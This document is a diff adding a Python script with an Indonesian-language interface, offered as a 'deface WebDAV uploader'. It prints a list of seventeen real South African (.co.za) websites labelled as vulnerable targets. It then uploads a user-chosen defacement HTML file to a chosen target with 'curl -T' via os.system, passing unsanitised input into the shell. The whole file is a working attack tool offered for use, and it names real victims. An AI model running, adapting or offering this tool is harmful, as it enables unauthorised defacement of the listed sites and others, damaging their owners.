@@ -1,0 +1,103 @@
+import os, time
+banner = u'\x1b[1;92m\n\n\n\n \u252c \u252c\u250c\u2500\u2510\u250c\u2510 \u250c\u252c\u2510\u250c\u2500\u2510\u252c  \u252c  \u252c \u252c\u250c\u2500\u2510\u252c  \u250c\u2500\u2510\u250c\u2500\u2510\u250c\u252c\u2510\u250c\u2500\u2510\u252c\u2500\u2510\n \u2502\u2502\u2502\u251c\u2524 \u251c\u2534\u2510 \u2502\u2502\u251c\u2500\u2524\u2514\u2510\u250c\u2518  \u2502 \u2502\u251c\u2500\u2518\u2502  \u2502 \u2502\u251c\u2500\u2524 \u2502\u2502\u251c\u2524 \u251c\u252c\u2518\n \u2514\u2534\u2518\u2514\u2500\u2518\u2514\u2500\u2518\u2500\u2534\u2518\u2534 \u2534 \u2514\u2518   \u2514\u2500\u2518\u2534  \u2534\u2500\u2518\u2514\u2500\u2518\u2534 \u2534\u2500\u2534\u2518\u2514\u2500\u2518\u2534\u2514\u2500\n \x1b[1;97;41m  DEFACE WEBDAV UPLOADER BY: NJANK SOEKAMTI  \x1b[0m\n'
+
+def daftar():
+    os.system('clear')
+    print(banner)
+    time.sleep(0.5)
+    print('\x1b[1;97m [\x1b[1;96m#\x1b[1;97m] Salin salah satu link target dibawah')
+    print('\x1b[1;97m ========================================')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://bitsandpieces.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://cblandscapes.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://windmillsandporcupines.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://scnc.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://contsol.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://consultec.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://colourfactory.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://ayk.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://daretogowildafrica.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://floralandfresh.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://foodconsult.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://itsengineering.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://hybriddevelopments.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://holotropicbreathwork.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://hanover-cs.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://handj.co.za')
+    time.sleep(0.1)
+    print(u'\x1b[1;97m [\x1b[1;95m\u2022\x1b[1;97m] \x1b[0;97mhttp://legacypride.co.za')
+    input('\n\x1b[1;97m [\x1b[1;96m#\x1b[1;97m] Tekan enter untuk melanjutkan')
+    bacok()
+
+
+def menu():
+    print('\x1b[1;97m [\x1b[1;96m1\x1b[1;97m] \x1b[0;97mLihat daftar web Vuln')
+    print('\x1b[1;97m [\x1b[1;96m2\x1b[1;97m] \x1b[0;97mLangsung bacok')
+    print('\x1b[1;97m [\x1b[1;91m0\x1b[1;97m] \x1b[0;97mKeluar')
+
+
+def bacok():
+    os.system('clear')
+    print(banner)
+    time.sleep(0.5)
+    print('\x1b[1;97m [\x1b[1;91m+\x1b[1;97m] \x1b[0;97mMasukan nama file script deface')
+    time.sleep(0.1)
+    print('\x1b[1;97m [\x1b[1;91m+\x1b[1;97m] \x1b[0;97mScript deface harus ada di sdcard')
+    time.sleep(0.1)
+    print('\x1b[1;97m [\x1b[1;91m+\x1b[1;97m] Contoh: \x1b[0;97mkontol.html')
+    time.sleep(0.1)
+    sc = input('\x1b[1;97m [\x1b[1;91m+\x1b[1;97m] \x1b[1;97mScript: \x1b[0;97m/sdcard/')
+    time.sleep(0.1)
+    tg = input('\x1b[1;97m [\x1b[1;91m+\x1b[1;97m] \x1b[1;97mTarget: \x1b[0;97m')
+    os.system('curl -T /sdcard/%s %s' % (sc, tg))
+    os.system('clear')
+    print(banner)
+    time.sleep(0.1)
+    print('\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[0;97mSilahkan cek websitenya')
+    time.sleep(0.1)
+    print('\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[0;97m%s/%s' % (tg, sc))
+    time.sleep(0.1)
+    input('\n\x1b[1;97m [\x1b[1;91mx\x1b[1;97m] Tekan enter untuk keluar')
+    keluar()
+
+
+def keluar():
+    os.system('clear')
+    print(banner)
+    time.sleep(0.1)
+    print('\x1b[1;97m [\x1b[1;96m$\x1b[1;97m] \x1b[0;97mTerima kasih sudah menggunakan tool ini')
+    time.sleep(0.1)
+    print('\x1b[1;97m [\x1b[1;96m$\x1b[1;97m] \x1b[0;97mYoutube: Njank Soekamti')
+    time.sleep(0.1)
+    print('\x1b[1;97m [\x1b[1;96m$\x1b[1;97m] \x1b[0;97mSupport: TERMUXID3')
+    time.sleep(0.1)
+    print('\x1b[1;97m [\x1b[1;91mx\x1b[1;97m] \x1b[0;97mGoodBye ...\n')
+
+
+os.system('clear')
+print(banner)
+menu()
+pilih = input('\n\x1b[1;97m [\x1b[1;96m#\x1b[1;97m] \x1b[0;97mPilih: ')
+if pilih == '1':
+    daftar()
+elif pilih == '2':
+    bacok()
+elif pilih == '0':
+    keluar()
+else:
+    keluar()
